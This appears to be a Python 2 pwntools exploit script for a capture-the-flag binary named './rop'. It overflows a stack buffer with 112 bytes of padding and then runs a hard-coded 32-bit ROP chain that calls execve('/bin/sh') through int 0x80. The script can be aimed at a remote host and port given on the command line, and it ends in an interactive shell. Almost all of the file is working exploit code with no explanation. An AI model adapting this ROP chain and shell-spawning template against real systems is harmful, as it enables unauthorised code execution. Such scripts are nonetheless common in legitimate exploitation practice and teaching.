#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import sys
debug = 1
arch_64 = 0
exe = "./rop"

r = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
rul = lambda x:p.recvline()
sd = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sea = lambda x:p.sendafter(x)
sela = lambda x:p.sendlineafter(x)

context.terminal = ["tmux","splitw","-h"]
e = ELF(exe)
if debug:
    context.log_level = "debug"

if len(sys.argv)>1:
    p = remote(sys.argv[1],int(sys.argv[2]))
    libc = ELF("./libc.so.6")
else:
    p = process([exe])
    if arch_64:
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        arena = 0x3c4b20
        context.arch = "amd64"
    else:
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
        arena = 0x1b2780
        context.arch = "i386"

def z():
    gdb.attach(p)

'''
0x080b7fb6 : pop eax ; ret
0x0806ee09 : pop ebx ; pop edx ; ret
0x0806ee30 : pop edx ; pop ecx ; pop ebx ; ret
0x0806ca85 : int 0x80
'''
pop_eax = 0x080b7fb6
ppp_dcb = 0x0806ee30
int_80 = 0x0806ca85

'''
execve("/bin/sh",0,0)
ebx = bin_sh, ecx=0 ,edx=0
'''
#bin_sh = e.symbols["shell"]
bin_sh = 0x80bb128
p1 = "A"*112+p32(pop_eax)+p32(11)+p32(ppp_dcb)+p32(0)+p32(0)+p32(bin_sh)+p32(int_80)

p.sendline(p1)
p.interactive()


